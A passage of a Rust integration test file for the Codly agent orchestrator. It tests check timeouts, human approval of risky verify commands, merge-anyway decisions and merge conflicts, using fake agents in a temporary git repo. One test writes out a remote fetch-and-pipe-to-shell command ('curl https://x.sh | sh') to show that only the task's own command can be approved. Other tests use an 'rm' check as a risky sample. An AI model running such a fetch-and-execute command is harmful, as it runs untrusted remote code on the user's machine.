//! The gate's fairness and safety, end to end with fake agents in a temp git repo:
//! - a check that runs out of time blocks the task for you and costs the worker no fix round;
//!   Re-run checks runs the gate again with no worker turn;
//! - a verify command with a risk (the approval rules' own check) is not run until you allow
//!   it from the task; a risky integration check is refused;
//! - Merge anyway lands a task whose checks failed, with the failure kept in its record, and
//!   is refused for a task that something else stopped;
//! - a team member's stopped task can be checked or merged anyway after the member's worktree
//!   moved on to its next task;
//! - a merge conflict has its own rounds (two used fix rounds do not fail the task), and a
//!   task that fails with conflict markers is not left in the middle of a merge;
//! - a worker whose turn ends with no report is asked for it once before its work is checked;
//! - a huge new folder the repository does not ignore (a dependency folder) is left out of
//!   Codly's commit: the task says so once, the worker is asked about it once before the checks
//!   run, and the folder costs no fix round;
//! - what a commit leaves out when no worker turn follows goes to the Lead: on your own pass,
//!   after the worker's one answer, and at a merge that Codly concludes in the task's worktree;
//! - a turn that failed while the work was reviewed is not checked when the review ends: the
//!   worker is asked to continue first, and a turn that ended on the usage limit (nobody is
//!   asked to continue) does not leave the task waiting;
//! - after a context compaction the next prompt to the worker carries its task again.

use std::collections::{HashMap, VecDeque};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use codly_core::adapters::{AdapterEvent, AgentCmd, AgentHandle, SessionMode, SpawnSpec};
use codly_core::model::*;
use codly_core::orchestrator::{Core, CoreConfig, SpawnFuture, Spawner, StartOptions};
use serde_json::{Value, json};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::UnixStream;
use tokio::sync::mpsc;

/// `Core::shutdown`, and every run exited when it was told to stop. A fake agent that ignores
/// the stop fails here, in its own test: else the shutdown's last resort kills every process
/// group this test process started, the check commands of the tests beside it too.
async fn shut_down(core: &Core) {
    core.shutdown().await;
    assert_eq!(core.runs_given_up(), 0, "a run outlived the shutdown: its fake did not exit when told to stop");
}

/// Your own git settings (`~/.gitconfig`, the system file) reach no git of this test: neither
/// the core's (`core_env`) nor the test's own, which commits as a fixed author.
const NO_GIT_CONFIG: [(&str, &str); 2] = [("GIT_CONFIG_GLOBAL", "/dev/null"), ("GIT_CONFIG_NOSYSTEM", "1")];

/// Who the test's own commits are by, whatever the repository says.
const TEST_AUTHOR: [(&str, &str); 4] =
    [("GIT_AUTHOR_NAME", "Test"), ("GIT_AUTHOR_EMAIL", "test@example.com"), ("GIT_COMMITTER_NAME", "Test"), ("GIT_COMMITTER_EMAIL", "test@example.com")];

/// The environment the core runs with: this process's, without your git settings.
fn core_env() -> HashMap<String, String> {
    std::env::vars().chain(NO_GIT_CONFIG.map(|(k, v)| (k.to_string(), v.to_string()))).collect()
}

fn git(dir: &Path, args: &[&str]) -> std::process::Output {
    Command::new("git").envs(NO_GIT_CONFIG).envs(TEST_AUTHOR).arg("-C").arg(dir).args(args).output().unwrap()
}

fn temp_repo(root: &Path) -> PathBuf {
    let repo = root.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    for args in [&["init", "-q", "-b", "main"][..], &["config", "user.name", "Test"], &["config", "user.email", "test@example.com"]] {
        assert!(git(&repo, args).status.success());
    }
    std::fs::write(repo.join("README.md"), "# demo\n").unwrap();
    assert!(git(&repo, &["add", "-A"]).status.success());
    assert!(git(&repo, &["commit", "-qm", "init"]).status.success());
    repo
}

fn claude() -> CliInfo {
    CliInfo {
        provider: Provider::Claude,
        path: Some("/usr/bin/true".into()),
        version: Some("fake".into()),
        logged_in: Some(true),
        billing: Billing::Subscription,
        plan: None,
        problem: None,
        transport: "fake".into(),
        install: codly_core::env::install_hint(Provider::Claude),
        default_model: None,
    }
}

#[derive(Clone)]
struct FakeTurn {
    spec: Arc<SpawnSpec>,
    prompt: String,
    events: mpsc::UnboundedSender<AdapterEvent>,
    /// Set by `fail`: the turn ends as failed, with this error.
    error: Arc<Mutex<Option<String>>>,
}

impl FakeTurn {
    fn emit(&self, kind: EventKind) {
        let _ = self.events.send(AdapterEvent { agent_id: self.spec.agent_id.clone(), run_id: self.spec.run_id.clone(), kind });
    }

    fn say(&self, text: &str) {
        self.emit(EventKind::Message { item_id: new_id(), text: text.into(), phase: MessagePhase::Final });
    }

    /// The turn ends on this error instead of completing.
    fn fail(&self, error: &str) {
        *self.error.lock().unwrap() = Some(error.into());
    }

    /// Call a codly_* tool exactly like the stdio bridge does.
    async fn tool(&self, name: &str, args: Value) -> Value {
        let mcp = self.spec.mcp.as_ref().expect("Codly gives every agent its MCP server");
        let env = |k: &str| mcp.env.iter().find(|(n, _)| n == k).map(|(_, v)| v.clone()).unwrap();
        let mut s = UnixStream::connect(env("CODLY_MCP_SOCK")).await.unwrap();
        let req = json!({ "token": env("CODLY_MCP_TOKEN"), "tool": name, "args": args });
        s.write_all(format!("{req}\n").as_bytes()).await.unwrap();
        let mut lines = BufReader::new(s).lines();
        serde_json::from_str(&lines.next_line().await.unwrap().unwrap()).unwrap()
    }

    fn write(&self, rel: &str, content: &str) {
        std::fs::write(self.spec.cwd.join(rel), content).unwrap();
    }

    /// The worker's report; shared.txt is the one file these tests write outside a scope.
    async fn done(&self) {
        let report = json!({ "status": "done", "summary": "Did it.", "scope_exceptions": ["shared.txt: both tasks need it"] });
        self.tool("codly_submit_report", report).await;
    }
}

type Behavior = Arc<dyn Fn(FakeTurn) -> std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send>> + Send + Sync>;
/// (role, agent id, prompt) of every turn.
type Turns = Arc<Mutex<Vec<(Role, String, String)>>>;

struct FakeSpawner {
    lead: Behavior,
    worker: Behavior,
    turns: Turns,
}

/// How long a turn still has to end once its run is told to stop: well inside the 4 s that
/// `Core::shutdown` gives every run.
const STOP_GRACE: Duration = Duration::from_secs(1);

/// Run a turn to its end, like a CLI: what comes meanwhile waits for that end. A stop gives the
/// turn `STOP_GRACE` more to end (the run then exits after it), else the run exits in the middle
/// of it: false. A turn that waits for the test and never looks at its run's commands would
/// keep the run alive through `Core::shutdown`, whose last resort kills every process group
/// this test process started, the check commands of the tests beside it too.
async fn end_turn(
    mut turn: std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send>>,
    rx: &mut mpsc::UnboundedReceiver<AgentCmd>,
    waiting: &mut VecDeque<AgentCmd>,
) -> bool {
    loop {
        tokio::select! {
            _ = &mut turn => return true,
            cmd = rx.recv() => match cmd {
                Some(AgentCmd::Shutdown) => break,
                Some(cmd) => waiting.push_back(cmd),
                // Nobody is left to tell it anything: the turn runs to its end.
                None => {
                    turn.await;
                    return true;
                }
            },
        }
    }
    let ended = tokio::time::timeout(STOP_GRACE, turn).await.is_ok();
    if ended {
        // First in line: the run exits before it starts a turn on a prompt that came earlier,
        // whose wait would not see a stop that is already read.
        waiting.push_front(AgentCmd::Shutdown);
    }
    ended
}

impl Spawner for FakeSpawner {
    fn spawn(&self, spec: SpawnSpec, events: mpsc::UnboundedSender<AdapterEvent>) -> SpawnFuture {
        let behavior = if spec.role == Role::Lead { self.lead.clone() } else { self.worker.clone() };
        let turns = self.turns.clone();
        Box::pin(async move {
            let session = match &spec.session {
                SessionMode::New { session_id } => session_id.clone().unwrap_or_else(|| format!("fake-{}", spec.run_id)),
                SessionMode::Resume { session_id } => session_id.clone(),
            };
            let (tx, mut rx) = mpsc::unbounded_channel::<AgentCmd>();
            let spec = Arc::new(spec);
            let send = {
                let (events, spec) = (events.clone(), spec.clone());
                move |kind| {
                    let _ = events.send(AdapterEvent { agent_id: spec.agent_id.clone(), run_id: spec.run_id.clone(), kind });
                }
            };
            send(EventKind::SessionStarted {
                provider: spec.provider,
                model: Some("fake-model".into()),
                cwd: spec.cwd.to_string_lossy().into_owned(),
                cli_version: None,
                session_id: Some(session),
                billing: Billing::Subscription,
                tools: vec![],
            });
            let spec2 = spec.clone();
            tokio::spawn(async move {
                // What came while a turn ran: read when the turn is over, in order.
                let mut waiting = VecDeque::new();
                loop {
                    let cmd = match waiting.pop_front() {
                        Some(cmd) => cmd,
                        None => match rx.recv().await {
                            Some(cmd) => cmd,
                            None => break,
                        },
                    };
                    match cmd {
                        AgentCmd::Prompt(text) => {
                            turns.lock().unwrap().push((spec2.role, spec2.agent_id.clone(), text.clone()));
                            send(EventKind::TurnStarted { input: Some(text.clone()) });
                            send(EventKind::StatusChanged { status: AgentStatus::Thinking });
                            let error = Arc::new(Mutex::new(None));
                            if !end_turn(behavior(FakeTurn { spec: spec2.clone(), prompt: text, events: events.clone(), error: error.clone() }), &mut rx, &mut waiting).await {
                                send(EventKind::Exited { code: Some(0) });
                                break;
                            }
                            let result_text = error.lock().unwrap().take();
                            let status = if result_text.is_some() { TurnStatus::Failed } else { TurnStatus::Completed };
                            send(EventKind::TurnCompleted { status, result_text, duration_ms: Some(5) });
                            send(EventKind::StatusChanged { status: AgentStatus::Idle });
                        }
                        AgentCmd::Shutdown => {
                            send(EventKind::Exited { code: Some(0) });
                            break;
                        }
                        AgentCmd::Interrupt | AgentCmd::Approval { .. } | AgentCmd::Session { .. } => {}
                    }
                }
            });
            Ok(AgentHandle { agent_id: spec.agent_id.clone(), run_id: spec.run_id.clone(), tx })
        })
    }
}

fn task(id: &str, file: &str, verify: &str) -> Value {
    json!({
        "id": id, "title": format!("Create {file}"), "goal": format!("Create {file}"), "consultant": { "title": "Backend" },
        "acceptance_criteria": [format!("{file} is right")], "write_scope": [file], "depends_on": [], "verify": [verify], "size": "M",
    })
}

/// A Lead that submits this plan for every request.
fn lead_with(plan: Value) -> Behavior {
    Arc::new(move |turn: FakeTurn| {
        let plan = plan.clone();
        Box::pin(async move {
            if turn.prompt.contains("[Codly]") {
                turn.say("Noted.");
                return;
            }
            let reply = turn.tool("codly_submit_plan", plan).await;
            assert_eq!(reply["ok"], true, "{reply}");
            turn.say("Planned.");
        })
    })
}

/// A worker that writes hello.txt on every turn.
fn hello_worker() -> Behavior {
    Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            turn.write("hello.txt", "hello\n");
            turn.done().await;
        })
    })
}

/// A core with one open repo, where a request runs its plan at once.
async fn start(root: &Path, spawner: FakeSpawner, settings: Settings) -> Arc<Core> {
    let repo = temp_repo(root);
    let cfg = CoreConfig { data_dir: root.join("data"), app_exe: PathBuf::from("/usr/bin/true") };
    let opts = StartOptions { spawner: Some(Arc::new(spawner)), env: Some(core_env()), clis: Some(vec![claude()]), index: false };
    let core = Core::start_with(cfg, opts).await.unwrap();
    core.update_settings(settings).await.unwrap();
    core.open_workspace(repo.to_str().unwrap()).await.unwrap();
    core.send_chat("lead", "Please do it").await.unwrap();
    core
}

fn auto() -> Settings {
    Settings { auto_run_plans: true, lead_followups: false, ..Default::default() }
}

async fn wait_for<T>(what: &str, secs: u64, mut f: impl AsyncFnMut() -> Option<T>) -> T {
    let deadline = tokio::time::Instant::now() + Duration::from_secs(secs);
    loop {
        if let Some(v) = f().await {
            return v;
        }
        assert!(tokio::time::Instant::now() < deadline, "timed out waiting for {what}");
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

async fn task_by_key(core: &Core, key: &str) -> Option<Task> {
    core.snapshot().await.unwrap().tasks.into_iter().find(|t| t.key == key)
}

async fn wait_task(core: &Core, key: &str, status: TaskStatus) -> Task {
    wait_for(&format!("{key} to be {status:?}"), 40, async || task_by_key(core, key).await.filter(|t| t.status == status)).await
}

async fn wait_plan(core: &Core, status: PlanStatus) {
    wait_for(&format!("the plan to be {status:?}"), 40, async || {
        core.snapshot().await.unwrap().plans.first().is_some_and(|p| p.status == status).then_some(())
    })
    .await
}

/// Every event of the office, oldest first.
async fn events(core: &Core) -> Vec<EventRow> {
    let mut all = core.events(None, None, 4000).await.unwrap();
    all.sort_by_key(|e| e.id);
    all
}

/// Codly's verify runs, oldest first: (command, passed).
fn verified(events: &[EventRow]) -> Vec<(String, bool)> {
    events
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::Verified { command, ok, .. } => Some((command.clone(), *ok)),
            _ => None,
        })
        .collect()
}

/// (method, summary, detail) of every decision, oldest first.
fn decisions(events: &[EventRow]) -> Vec<(String, String, Value)> {
    events
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::Decision { method, summary, detail, .. } => Some((method.clone(), summary.clone(), detail.clone())),
            _ => None,
        })
        .collect()
}

fn worker_prompts(turns: &Turns) -> Vec<String> {
    turns.lock().unwrap().iter().filter(|t| t.0 == Role::Worker).map(|t| t.2.clone()).collect()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_check_that_runs_out_of_time_blocks_the_task_and_costs_no_fix_round() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", "sleep 3 && grep -q hello hello.txt")] });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: turns.clone() };
    let core = start(dir.path(), spawner, Settings { verify_timeout_secs: 1, ..auto() }).await;

    let t = wait_task(&core, "t1", TaskStatus::Blocked).await;
    let reason = t.status_reason.clone().unwrap();
    assert!(reason.contains("did not finish in 1 s") && reason.contains("time limit for checks") && reason.contains("merge anyway"), "{reason}");
    let before = events(&core).await;
    assert_eq!(verified(&before), [("sleep 3 && grep -q hello hello.txt".to_string(), false)]);
    assert!(!decisions(&before).iter().any(|d| d.1.contains("fix round")), "a timeout is not the worker's to fix");
    assert_eq!(worker_prompts(&turns).len(), 1, "the worker is not asked to fix a timeout");

    // You raise the limit and re-run the checks: no worker turn, and the task lands.
    core.update_settings(Settings { verify_timeout_secs: 60, ..auto() }).await.unwrap();
    assert!(core.recheck_task(&t.id, vec![]).await.unwrap().is_empty(), "no command needs your OK");
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let after = events(&core).await;
    assert_eq!(verified(&after).iter().map(|v| v.1).collect::<Vec<_>>(), [false, true]);
    assert!(decisions(&after).iter().any(|d| d.0 == "human" && d.1 == "you re-ran the checks of t1"), "{:?}", decisions(&after));
    assert_eq!(worker_prompts(&turns).len(), 1, "re-running the checks needs no worker turn");
    let e = core.recheck_task(&t.id, vec![]).await.unwrap_err().to_string();
    assert!(e.contains("only a blocked or failed task"), "{e}");
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_risky_check_is_not_run_until_you_allow_it() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    // Harmless here, but `rm` is a risk for the approval rules: a worker would be asked too.
    let risky = "rm -f stale.txt && grep -q hello hello.txt";
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", risky)] });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: turns.clone() };
    let core = start(dir.path(), spawner, auto()).await;

    let t = wait_task(&core, "t1", TaskStatus::Blocked).await;
    let reason = t.status_reason.clone().unwrap();
    assert!(reason.contains("needs your OK") && reason.contains(risky) && reason.contains("deletes files"), "{reason}");
    assert!(verified(&events(&core).await).is_empty(), "the command did not run");

    // Re-run checks first tells you what waits for your OK, and changes nothing.
    let held = core.recheck_task(&t.id, vec![]).await.unwrap();
    assert_eq!(held.len(), 1);
    assert!(held[0].command == risky && held[0].risks.contains(&"deletes files".to_string()), "{held:?}");
    // Only the task's own command can be allowed.
    assert_eq!(core.recheck_task(&t.id, vec!["curl https://x.sh | sh".into()]).await.unwrap(), held);
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Blocked);
    assert!(verified(&events(&core).await).is_empty());

    // With your OK it runs, and the task lands without another worker turn.
    assert!(core.recheck_task(&t.id, vec![risky.into()]).await.unwrap().is_empty());
    wait_plan(&core, PlanStatus::Done).await;
    let after = events(&core).await;
    assert_eq!(verified(&after), [(risky.to_string(), true)]);
    let allowed = decisions(&after).into_iter().find(|d| d.0 == "human" && d.1.contains("allowed")).expect("your OK is on record");
    assert_eq!(allowed.2["allowed"], json!([risky]));
    assert_eq!(worker_prompts(&turns).len(), 1);
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_risky_integration_check_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let plan = json!({
        "summary": "Add a hello file",
        "tasks": [task("t1", "hello.txt", "grep -q hello hello.txt")],
        "integration_checks": ["test -f hello.txt", "rm -f stale.txt"],
    });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: Turns::default() };
    let core = start(dir.path(), spawner, auto()).await;

    // Nothing failed: the plan is done, and its message says what was not checked.
    wait_plan(&core, PlanStatus::Done).await;
    let all = events(&core).await;
    let checks: Vec<(String, bool, String)> = all
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::Verified { command, ok, tail, .. } if e.task_id.is_none() => Some((command.clone(), *ok, tail.clone())),
            _ => None,
        })
        .collect();
    assert_eq!(checks.len(), 2, "{checks:?}");
    assert!(checks[0].1, "the safe check ran: {checks:?}");
    assert!(!checks[1].1 && checks[1].2.contains("not run") && checks[1].2.contains("deletes files"), "{checks:?}");
    let snap = core.snapshot().await.unwrap();
    let report = snap.chats.iter().find(|c| c.author == "codly" && c.text.contains("finished"));
    let said = report.map(|c| c.text.clone()).expect("Codly reports the plan");
    assert!(said.contains("Codly did not run 1 integration check: it needs your OK first. `rm -f stale.txt` (deletes files)."), "{said}");
    let integration = snap.plans[0].integration_worktree.clone().unwrap();
    assert!(said.contains(&format!("Run it yourself in {integration}")) && said.contains("then merge it into main"), "{said}");
    assert!(!said.contains("failed") && !said.contains("fix plan"), "a check that did not run did not fail: {said}");
    let merge = decisions(&all).into_iter().rfind(|d| !d.2["refused_checks"].is_null()).expect("the decision keeps the refused check");
    assert_eq!(merge.2["refused_checks"], json!([{ "command": "rm -f stale.txt", "risks": ["deletes files"] }]));
    assert_eq!(merge.2["failed_checks"], json!([]));
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn merge_anyway_lands_a_task_whose_checks_failed() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let failing = "grep -q nope hello.txt";
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", failing)] });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: turns.clone() };
    let core = start(dir.path(), spawner, auto()).await;

    let t = wait_task(&core, "t1", TaskStatus::Failed).await;
    assert!(t.status_reason.as_deref().is_some_and(|r| r.contains("after 2 fix rounds")), "{:?}", t.status_reason);
    assert_eq!(worker_prompts(&turns).len(), 3, "the brief and two fix rounds");

    let accepted = core.accept_task(&t.id).await.unwrap();
    assert_eq!(accepted.status, TaskStatus::Verifying);
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    // The failures stay in the record, and the checks were not run again.
    assert_eq!(verified(&all), vec![(failing.to_string(), false); 3]);
    let yours = decisions(&all).into_iter().find(|d| d.0 == "human" && d.1.contains("merge t1 anyway")).expect("your decision is on record");
    assert!(yours.1.contains(failing), "{}", yours.1);
    assert_eq!(yours.2["last_failed"]["command"], failing);
    assert_eq!(yours.2["last_failed"]["exit_code"], 1);
    assert!(decisions(&all).iter().any(|d| d.1 == "t1: checks not run, you chose to merge anyway"));
    assert!(all.iter().any(|e| matches!(e.kind, EventKind::Merged { .. })));
    assert_eq!(worker_prompts(&turns).len(), 3, "merging anyway needs no worker turn");
    let e = core.accept_task(&t.id).await.unwrap_err().to_string();
    assert!(e.contains("can be merged anyway"), "{e}");
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn merge_anyway_is_only_for_a_task_its_checks_stopped() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    // The checks pass; the worker keeps writing a file outside its scope.
    let worker: Behavior = Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            turn.write("hello.txt", "hello\n");
            turn.write("other.txt", "not mine\n");
            turn.done().await;
        })
    });
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", "grep -q hello hello.txt")] });
    let core = start(dir.path(), FakeSpawner { lead: lead_with(plan), worker, turns: turns.clone() }, auto()).await;

    let t = wait_task(&core, "t1", TaskStatus::Failed).await;
    assert!(t.status_reason.as_deref().is_some_and(|r| r.contains("outside the write scope after 2 fix rounds")), "{:?}", t.status_reason);
    let e = core.accept_task(&t.id).await.unwrap_err().to_string();
    assert!(e.contains("was not stopped by its checks") && e.contains("Retry"), "{e}");
    // Nothing moved: no new pass, no worker turn, checks still on.
    let after = task_by_key(&core, "t1").await.unwrap();
    assert_eq!((after.status, &after.status_reason), (TaskStatus::Failed, &t.status_reason));
    assert_eq!(worker_prompts(&turns).len(), 3, "the brief and two fix rounds");
    assert!(!decisions(&events(&core).await).iter().any(|d| d.1.contains("anyway")), "no choice of yours is on record");
    shut_down(&core).await;
}

/// A plan of two tasks for the team member Ana: t1 has a verify command with a risk (it is
/// held), t2 a safe one. Ana works in one worktree, so t2 takes it over once t1 is stopped.
/// Ana's turn on t2 ends when `go` says so.
async fn member_tasks(root: &Path, go: Arc<tokio::sync::Notify>) -> (Arc<Core>, Turns) {
    let turns = Turns::default();
    let mut tasks = vec![task("t1", "t1.txt", RISKY), task("t2", "t2.txt", "test -f t2.txt")];
    for t in &mut tasks {
        // Ana's, not a consultant's.
        t.as_object_mut().unwrap().remove("consultant");
        t["assignee"] = json!("Ana");
    }
    let plan = json!({ "summary": "Add files", "tasks": tasks });
    let worker: Behavior = Arc::new(move |turn: FakeTurn| {
        let go = go.clone();
        Box::pin(async move {
            // A brief names its task; back on a task (a retry), its file is already there.
            if let Some(key) = turn.prompt.split(BRIEF).nth(1).and_then(|s| s.split(':').next()) {
                if key == "t2" {
                    go.notified().await;
                }
                turn.write(&format!("{key}.txt"), "x\n");
            }
            turn.done().await;
        })
    });
    let ana = TeamMember { name: "Ana".into(), role: "Backend dev".into(), ..Default::default() };
    let core = start(root, FakeSpawner { lead: lead_with(plan), worker, turns: turns.clone() }, Settings { team: vec![ana], ..auto() }).await;
    (core, turns)
}

/// Harmless here, but `rm` is a risk for the approval rules.
const RISKY: &str = "rm -f stale.txt && test -f t1.txt";

fn branch_of(worktree: &Path) -> String {
    String::from_utf8(git(worktree, &["rev-parse", "--abbrev-ref", "HEAD"]).stdout).unwrap().trim().to_string()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_members_stopped_task_is_checked_after_its_worktree_moved_on() {
    let dir = tempfile::tempdir().unwrap();
    let go = Arc::new(tokio::sync::Notify::new());
    go.notify_one(); // t2 runs straight through
    let (core, turns) = member_tasks(dir.path(), go).await;

    let t1 = wait_task(&core, "t1", TaskStatus::Blocked).await;
    assert!(t1.status_reason.as_deref().is_some_and(|r| r.contains("needs your OK")), "{:?}", t1.status_reason);
    // Ana did t2 meanwhile, in the same worktree, and is free again.
    let t2 = wait_task(&core, "t2", TaskStatus::Done).await;
    let ana = t1.assignee.clone().unwrap();
    let free = async || core.snapshot().await.unwrap().agents.iter().any(|a| a.id == ana && a.run_id.is_none()).then_some(());
    wait_for("Ana to be free", 20, free).await;
    let wt = PathBuf::from(t1.worktree.clone().unwrap());
    assert_eq!(t2.worktree, t1.worktree, "a member has one worktree");
    assert_eq!(Some(branch_of(&wt)), t2.branch, "the worktree is on t2's branch");

    // Re-run checks still says what waits for your OK.
    let held = core.recheck_task(&t1.id, vec![]).await.unwrap();
    assert!(held.len() == 1 && held[0].command == RISKY, "{held:?}");
    // With your OK, Codly brings the worktree back to t1 and checks it, with no worker turn.
    assert!(core.recheck_task(&t1.id, vec![RISKY.into()]).await.unwrap().is_empty());
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    // The check passed, and t1.txt is only on t1's branch: the worktree was back on it.
    let all = events(&core).await;
    assert!(verified(&all).contains(&(RISKY.to_string(), true)), "{:?}", verified(&all));
    assert_eq!(worker_prompts(&turns).len(), 2, "one brief per task, and no turn for the re-run");
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_members_stopped_task_waits_for_the_member_and_keeps_your_choice() {
    let dir = tempfile::tempdir().unwrap();
    let go = Arc::new(tokio::sync::Notify::new());
    let (core, turns) = member_tasks(dir.path(), go.clone()).await;

    let t1 = wait_task(&core, "t1", TaskStatus::Blocked).await;
    // Ana is in her turn on t2, in the worktree t1 shares.
    wait_for("Ana to start t2", 20, async || (worker_prompts(&turns).len() == 2).then_some(())).await;

    // Merge anyway cannot have the worktree now: t1 goes back in line for Ana.
    let queued = core.accept_task(&t1.id).await.unwrap();
    assert_eq!(queued.status, TaskStatus::Ready);
    assert!(queued.status_reason.as_deref().is_some_and(|r| r.contains("Ana is on other work")), "{:?}", queued.status_reason);
    let said = decisions(&events(&core).await);
    let yours = said.into_iter().find(|d| d.0 == "human" && d.1.contains("merge t1 anyway")).expect("your decision is on record");
    assert!(yours.1.contains("goes back to Ana first") && yours.2["waits_for"] == "Ana", "{yours:?}");
    assert_eq!(task_by_key(&core, "t2").await.unwrap().status, TaskStatus::Running, "Ana's turn on t2 goes on");

    // Ana finishes t2, then takes t1 again: the gate after that turn uses your choice.
    go.notify_one();
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    assert!(!verified(&all).iter().any(|v| v.0 == RISKY), "the check you skipped never ran: {:?}", verified(&all));
    assert!(decisions(&all).iter().any(|d| d.1 == "t1: checks not run, you chose to merge anyway"));
    let prompts = worker_prompts(&turns);
    assert!(prompts.len() == 3 && prompts[2].contains("You are back on task t1"), "{prompts:?}");
    shut_down(&core).await;
}

/// What t2's worker does on a turn, given its prompt: the task it waits to see merged first
/// (the test fixes the order of the merges that way), then the files it writes.
type Script = fn(&str) -> (Option<&'static str>, Vec<(&'static str, &'static str)>);

/// How a worker's task brief starts (its other prompts from Codly are feedback).
const BRIEF: &str = "[Codly] Task ";
const CONFLICT: &str = "Your branch conflicts";

/// Wait, 30 s at most, for something another task does.
async fn until(there: impl Fn() -> bool) {
    for _ in 0..1500 {
        if there() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    panic!("the other task did not get there");
}

/// Tasks that all write shared.txt (a declared scope exception) next to their own file. t1
/// and t2 start side by side and t1 merges first, so t2 conflicts with it at its merge.
/// The `later` tasks run one after the other behind t1; each one changes shared.txt again
/// once t2 was told of one more conflict, so t2 conflicts again.
async fn conflicting_tasks(root: &Path, later: &'static [&'static str], t2: Script) -> (Arc<Core>, Turns) {
    let turns = Turns::default();
    let mut tasks = vec![task("t1", "t1.txt", "test -f t1.txt"), task("t2", "t2.txt", "grep -q ok t2.txt")];
    let mut before = "t1";
    for &key in later {
        let mut t = task(key, &format!("{key}.txt"), &format!("test -f {key}.txt"));
        t["depends_on"] = json!([before]);
        tasks.push(t);
        before = key;
    }
    let plan = json!({ "summary": "Add files", "tasks": tasks });
    // t1 waits until t2 has its worktree: cut before t1's merge.
    let t2_up = Arc::new(AtomicBool::new(false));
    // Conflicts t2 was told of.
    let conflicts = Arc::new(AtomicUsize::new(0));
    let merged: Arc<Mutex<Vec<String>>> = Arc::default();
    // An agent's task: its last brief names it.
    let keys: Arc<Mutex<HashMap<String, String>>> = Arc::default();
    let worker: Behavior = {
        let merged = merged.clone();
        Arc::new(move |turn: FakeTurn| {
            let (t2_up, conflicts, merged, keys) = (t2_up.clone(), conflicts.clone(), merged.clone(), keys.clone());
            Box::pin(async move {
                let key = {
                    let mut keys = keys.lock().unwrap();
                    if let Some(key) = turn.prompt.split(BRIEF).nth(1).and_then(|s| s.split(':').next()) {
                        keys.insert(turn.spec.agent_id.clone(), key.to_string());
                    }
                    keys.get(&turn.spec.agent_id).cloned().expect("a task brief comes first")
                };
                if key == "t2" {
                    t2_up.store(true, Ordering::SeqCst);
                    if turn.prompt.contains(CONFLICT) {
                        conflicts.fetch_add(1, Ordering::SeqCst);
                    }
                    let (after, files) = t2(&turn.prompt);
                    if let Some(other) = after {
                        until(|| merged.lock().unwrap().iter().any(|k| k == other)).await;
                    }
                    for (file, content) in files {
                        turn.write(file, content);
                    }
                } else {
                    let turn_of = later.iter().position(|k| *k == key).map_or(0, |i| i + 1);
                    until(|| t2_up.load(Ordering::SeqCst) && conflicts.load(Ordering::SeqCst) >= turn_of).await;
                    turn.write(&format!("{key}.txt"), "x\n");
                    turn.write("shared.txt", &format!("from {key}\n"));
                }
                turn.done().await;
            })
        })
    };
    let core = start(root, FakeSpawner { lead: lead_with(plan), worker, turns: turns.clone() }, auto()).await;
    // The workers cannot see the board: tell them which tasks are merged.
    let board = core.clone();
    tokio::spawn(async move {
        while let Ok(s) = board.snapshot().await {
            *merged.lock().unwrap() = s.tasks.into_iter().filter(|t| t.status == TaskStatus::Done).map(|t| t.key).collect();
            tokio::time::sleep(Duration::from_millis(30)).await;
        }
    });
    (core, turns)
}

fn in_merge(worktree: &Path) -> bool {
    git(worktree, &["rev-parse", "-q", "--verify", "MERGE_HEAD"]).status.success()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_conflict_after_two_fix_rounds_still_goes_to_the_worker() {
    let dir = tempfile::tempdir().unwrap();
    // Two verify failures use both fix rounds; then the merge conflicts with t1's shared.txt.
    let t2: Script = |prompt| {
        if prompt.contains(CONFLICT) {
            (None, vec![("shared.txt", "from t1 and t2\n")])
        } else if prompt.contains("fix round 2/2") {
            (None, vec![("t2.txt", "ok\n")])
        } else if prompt.contains("fix round 1/2") {
